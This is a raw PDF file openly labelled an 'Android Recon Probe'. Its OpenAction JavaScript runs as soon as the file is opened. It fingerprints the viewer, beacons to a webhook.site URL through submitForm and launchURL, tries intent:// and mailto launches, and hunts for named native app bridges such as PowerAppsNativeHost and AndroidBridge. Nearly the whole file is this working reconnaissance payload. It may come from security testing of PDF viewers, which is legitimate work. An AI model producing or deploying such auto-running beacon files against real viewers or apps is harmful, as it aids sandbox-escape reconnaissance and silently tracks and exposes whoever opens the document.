%PDF-1.7
% Android Recon Probe - March 2026
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
   /OpenAction 3 0 R
>>
endobj

2 0 obj
<< /Type /Pages
   /Kids [4 0 R]
   /Count 1
>>
endobj

3 0 obj
<< /Type /Action
   /S /JavaScript
   /JS (
      try {
        var results = [];

        // === 1. ENGINE ===
        results.push("=== ENGINE ===");
        try { results.push("viewerVersion: " + app.viewerVersion); } catch(e) { results.push("viewerVersion: " + e); }
        try { results.push("viewerType: " + app.viewerType); } catch(e) { results.push("viewerType: " + e); }
        try { results.push("platform: " + app.platform); } catch(e) { results.push("platform: " + e); }
        try { results.push("language: " + app.language); } catch(e) { results.push("language: " + e); }

        // === 2. NETWORK ===
        results.push("=== NETWORK ===");
        try {
          this.submitForm({
            cURL: "https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?t=android",
            cSubmitAs: "HTML"
          });
          results.push("submitForm: no throw");
        } catch(e) { results.push("submitForm: " + e); }
        try {
          app.launchURL("https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?t=launch", false);
          results.push("launchURL: no throw");
        } catch(e) { results.push("launchURL: " + e); }
        try {
          app.launchURL("mailto:?body=androidtest", false);
          results.push("mailto: no throw");
        } catch(e) { results.push("mailto: " + e); }
        try {
          app.launchURL("intent://probe#Intent;scheme=probe;end", false);
          results.push("intent: no throw");
        } catch(e) { results.push("intent: " + e); }

        // === 3. METADATA ===
        results.push("=== METADATA ===");
        try {
          this.info.Title = "ANDROID_TEST";
          results.push("title write: " + this.info.Title);
        } catch(e) { results.push("title write: " + e); }

        // === 4. RESPONSE TEST ===
        results.push("=== RESPONSE ===");
        try { results.push("app.response type: " + typeof app.response); } catch(e) { results.push("response: " + e); }

        // === 5. WINDOW / WEBKIT ===
        results.push("=== WINDOW ===");
        try { results.push("window: " + typeof window); } catch(e) { results.push("window: " + e); }
        try { results.push("document: " + typeof document); } catch(e) { results.push("document: " + e); }
        try { results.push("XMLHttpRequest: " + typeof XMLHttpRequest); } catch(e) { results.push("XHR: " + e); }

        // === 6. ANDROID BRIDGES ===
        results.push("=== BRIDGES ===");
        try {
          var paNames = [
            "PowerAppsNativeHost","PAHost","AppMagicNative",
            "NativeInterface","AndroidBridge","CanvasHost",
            "PCFHost","FluentHost","MicrosoftHost","MAMHost"
          ];
          var found = paNames.filter(function(n) {
            try { return typeof window[n] !== "undefined"; } catch(e) { return false; }
          });
          results.push(found.length ? found.join(", ") : "none found");
        } catch(e) { results.push("bridges: " + e); }

        // === 7. BTOA ===
        results.push("=== BTOA ===");
        try {
          results.push("btoa: " + btoa("androidtest"));
        } catch(e) { results.push("btoa: " + e); }

        // === 8. FUNCTION SOURCES ===
        results.push("=== SOURCES ===");
        try { results.push("submitForm: " + this.submitForm.toString().slice(0,60)); } catch(e) { results.push("submitForm src: " + e); }
        try { results.push("launchURL: " + app.launchURL.toString().slice(0,60)); } catch(e) { results.push("launchURL src: " + e); }

        app.alert(results.join("\\n"));

      } catch(e) {
        app.alert("OUTER ERROR: " + e);
      }
   )
>>
endobj

4 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 400 300]
   /Contents 5 0 R
>>
endobj

5 0 obj
<< /Length 90 >>
stream
BT /F1 14 Tf 50 250 Td (Android Recon) Tj ET
BT /F1 12 Tf 50 220 Td (Check alert + webhook) Tj ET
endstream
endobj

xref
0 6
0000000000 65535 f 
0000000015 00000 n 
0000000075 00000 n 
0000000135 00000 n 
0000002400 00000 n 
0000002560 00000 n 

trailer
<< /Size 6 /Root 1 0 R >>
startxref
2650
%%EOF